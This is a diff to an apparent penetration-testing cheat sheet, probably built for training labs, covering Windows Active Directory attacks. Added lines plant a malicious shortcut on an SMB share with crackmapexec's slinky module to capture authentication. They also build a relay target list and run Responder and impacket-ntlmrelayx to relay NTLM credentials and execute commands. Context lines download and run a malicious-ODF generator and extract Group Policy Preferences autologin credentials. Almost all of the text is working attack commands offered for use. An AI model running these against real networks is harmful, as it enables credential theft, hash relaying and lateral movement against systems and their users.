@@ -477,6 +477,10 @@ pip install ezodf
 wget https://github.com/rmdavy/badodf/raw/master/badodt.py
 python3 badodt.py
 ```
+crackmapexec
+```bash
+crackmapexec smb 172.16.117.3 -u  -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
+```
 
 ## Other Bypass
 ```bash
@@ -599,9 +603,6 @@ crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 # GPP
 ## gpp-decryp cmd
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
-
-# Relay target
-crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
 ```
 ### PsMapexec
 ```powershell
@@ -712,9 +713,13 @@ Enter-PSSession ws01.inlanefreight.local
 # Lateral Movement
 ## NTLM Relay 
 ```bash
+# Enum target SMB
+crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
+# Responder
 sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" /etc/responder/Responder.conf
 responder -I tun0
 
+# ntlmrelayx
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c
 
